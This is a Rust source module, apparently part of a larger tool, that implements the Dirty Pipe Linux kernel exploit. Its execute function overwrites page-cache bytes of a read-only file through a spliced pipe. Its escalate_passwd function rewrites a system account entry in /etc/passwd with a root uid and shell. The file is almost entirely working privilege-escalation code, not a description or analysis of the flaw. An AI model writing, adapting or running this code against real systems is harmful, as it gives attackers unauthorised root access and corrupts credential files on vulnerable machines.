//! Core overwrite logic for Dirty Pipe

use super::pipe::PreparedPipe;
use super::splice::splice_file_to_pipe;
use log::{info, debug};
use std::os::fd::AsRawFd;
use std::fs::OpenOptions;

pub fn execute(target: &str, offset: u64, data: &[u8]) -> Result<(), String> {
    if offset == 0 { return Err("Offset must be > 0".into()); }
    if data.is_empty() { return Err("Data empty".into()); }

    // Check page boundary
    if (offset & 0xFFF) as usize + data.len() > 4096 {
        return Err("Crosses page boundary".into());
    }

    info!("[Overwrite] {}, offset={}, len={}", target, offset, data.len());

    let file = OpenOptions::new().read(true).open(target)
        .map_err(|e| format!("open: {}", e))?;
    let file_size = file.metadata().map_err(|e| format!("stat: {}", e))?.len();

    if offset + data.len() as u64 > file_size {
        return Err("Would extend past EOF".into());
    }

    let pipe = PreparedPipe::new()?;
    splice_file_to_pipe(file.as_raw_fd(), offset - 1, pipe.write_end())?;

    let written = unsafe {
        libc::write(pipe.write_end(), data.as_ptr() as *const _, data.len())
    };

    if written as usize != data.len() {
        return Err(format!("Partial write: {}/{}", written, data.len()));
    }

    info!("[Overwrite] SUCCESS: {} bytes to page cache", data.len());
    Ok(())
}

pub fn escalate_passwd() -> Result<(), String> {
    let passwd = std::fs::read_to_string("/etc/passwd")
        .map_err(|e| format!("read: {}", e))?;

    for target in ["games:", "news:", "proxy:", "backup:"] {
        if let Some(pos) = passwd.find(target) {
            let line_end = passwd[pos..].find('\n').map(|i| pos + i).unwrap_or(passwd.len());
            let line_len = line_end - pos;
            let prefix_len = target.len();
            let payload = b"x:0:0::/root:/bin/sh";

            if prefix_len + payload.len() < line_len {
                let offset = (pos + prefix_len) as u64;
                info!("[Escalate] Overwriting {} at {}", target, offset);
                return execute("/etc/passwd", offset, payload);
            }
        }
    }

    Err("No suitable target found".into())
}
